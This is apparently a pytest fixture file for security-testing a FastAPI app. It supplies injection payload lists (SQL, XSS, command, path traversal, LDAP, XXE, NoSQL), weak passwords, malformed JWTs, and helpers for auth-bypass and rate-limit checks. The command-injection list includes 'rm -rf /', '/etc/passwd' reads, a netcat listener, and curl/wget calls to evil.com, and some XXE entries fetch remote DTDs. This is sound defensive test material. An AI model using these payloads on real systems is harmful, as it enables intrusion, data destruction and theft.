"""
Security Test Configuration

Fixtures and utilities for security testing.
"""
import secrets
import string
from typing import Dict, Any, List
import pytest
from fastapi.testclient import TestClient

from app.main import app
from tests.conftest import get_test_db


@pytest.fixture
def security_client() -> TestClient:
    """Provide test client for security testing."""
    return TestClient(app)


@pytest.fixture
def malicious_payloads() -> Dict[str, List[str]]:
    """Provide common malicious payloads for security testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked'); --"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input type=text value='' onfocus=alert('XSS') autofocus>"
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "| nc -l 4444",
            "; curl http://evil.com/$(whoami)",
            "&& wget http://evil.com/shell.sh",
            "; python -c \"import os; os.system('id')\""
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            "../../../var/log/apache2/access.log",
            "..\\..\\..\\windows\\system.ini"
        ],
        "ldap_injection": [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(objectClass=*",
            "admin)(|(objectClass=*)",
            "*))%00",
            "admin))(|(cn=*",
            "*)(userPassword=*"
        ],
        "xml_injection": [
            "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/evil.xml\">]>",
            "<script xmlns=\"http://www.w3.org/1999/xhtml\">alert('XSS')</script>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\"> %dtd;]>",
        ],
        "nosql_injection": [
            "'; return db.users.find(); var dummy='",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$regex\": \".*\"}",
            "true; return db.users.drop(); var dummy=true",
            "{\"$or\": [{}, {\"password\": {\"$regex\": \".*\"}}]}",
        ],
        "large_payloads": [
            "A" * 10000,  # Large string
            "A" * 100000,  # Very large string
            "A" * 1000000,  # Extremely large string
        ]
    }


@pytest.fixture
def weak_passwords() -> List[str]:
    """Provide weak passwords for testing."""
    return [
        "password",
        "123456",
        "admin",
        "password123",
        "qwerty",
        "abc123",
        "12345678",
        "password1",
        "admin123",
        "root",
        "",  # Empty password
        " ",  # Space only
        "a",  # Single character
        "aa",  # Too short
    ]


@pytest.fixture
def strong_passwords() -> List[str]:
    """Provide strong passwords for testing."""
    return [
        "StrongPassword123!",
        "Complex@Password456",
        "SecurePass789#",
        "MyStr0ng&Password",
        "P@ssw0rd!Complex",
        "Ungu3ssab1e#Pass",
        "Sup3r$ecurePassword",
        "C0mpl3x!P@ssw0rd"
    ]


def generate_random_string(length: int = 10) -> str:
    """Generate random string for testing."""
    letters = string.ascii_letters + string.digits
    return ''.join(secrets.choice(letters) for _ in range(length))


def generate_jwt_token_with_weak_secret() -> str:
    """Generate JWT token with weak secret for testing."""
    import jwt
    import datetime
    
    payload = {
        "sub": "test@example.com",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
        "iat": datetime.datetime.utcnow(),
    }
    
    # Use weak secret
    weak_secret = "weak"
    token = jwt.encode(payload, weak_secret, algorithm="HS256")
    return token


@pytest.fixture
def invalid_tokens() -> List[str]:
    """Provide invalid JWT tokens for testing."""
    return [
        "invalid.token.here",
        "Bearer invalid",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0QGV4YW1wbGUuY29tIn0.",  # None algorithm
        "",  # Empty token
        "Bearer ",  # Bearer with no token
        "Basic dGVzdDp0ZXN0",  # Basic auth instead of Bearer
        "jwt_token_without_bearer_prefix",
        generate_jwt_token_with_weak_secret(),  # Token with weak secret
    ]


class SecurityTestHelper:
    """Helper class for security testing."""
    
    @staticmethod
    def test_input_sanitization(client: TestClient, endpoint: str, payload: Dict[str, Any], malicious_inputs: List[str]) -> List[Dict[str, Any]]:
        """Test input sanitization for an endpoint."""
        results = []
        
        for malicious_input in malicious_inputs:
            # Test each field with malicious input
            for field in payload.keys():
                test_payload = payload.copy()
                test_payload[field] = malicious_input
                
                response = client.post(endpoint, json=test_payload)
                
                results.append({
                    "field": field,
                    "input": malicious_input,
                    "status_code": response.status_code,
                    "response": response.json() if response.headers.get("content-type", "").startswith("application/json") else response.text,
                    "safe": response.status_code in [400, 422]  # Should reject malicious input
                })
        
        return results
    
    @staticmethod
    def test_rate_limiting(client: TestClient, endpoint: str, max_requests: int = 100, time_window: int = 60) -> Dict[str, Any]:
        """Test rate limiting on an endpoint."""
        import time
        
        start_time = time.time()
        responses = []
        
        for i in range(max_requests + 10):  # Test beyond limit
            response = client.get(endpoint)
            responses.append({
                "request_number": i + 1,
                "status_code": response.status_code,
                "timestamp": time.time() - start_time
            })
            
            # If we get rate limited, record it
            if response.status_code == 429:
                break
        
        return {
            "total_requests": len(responses),
            "rate_limited": any(r["status_code"] == 429 for r in responses),
            "responses": responses
        }
    
    @staticmethod
    def test_authentication_bypass(client: TestClient, protected_endpoints: List[str]) -> List[Dict[str, Any]]:
        """Test authentication bypass attempts."""
        results = []
        
        bypass_attempts = [
            {},  # No auth header
            {"Authorization": ""},  # Empty auth header
            {"Authorization": "Bearer "},  # Bearer with no token
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # Basic auth
            {"Authorization": "Bearer invalid_token"},  # Invalid token
            {"X-User-ID": "1"},  # Try to bypass with user ID header
            {"X-Forwarded-For": "127.0.0.1"},  # IP spoofing attempt
            {"X-Real-IP": "localhost"},  # IP spoofing attempt
        ]
        
        for endpoint in protected_endpoints:
            for i, headers in enumerate(bypass_attempts):
                response = client.get(endpoint, headers=headers)
                
                results.append({
                    "endpoint": endpoint,
                    "bypass_attempt": i + 1,
                    "headers": headers,
                    "status_code": response.status_code,
                    "bypassed": response.status_code == 200  # Should be 401/403
                })
        
        return results
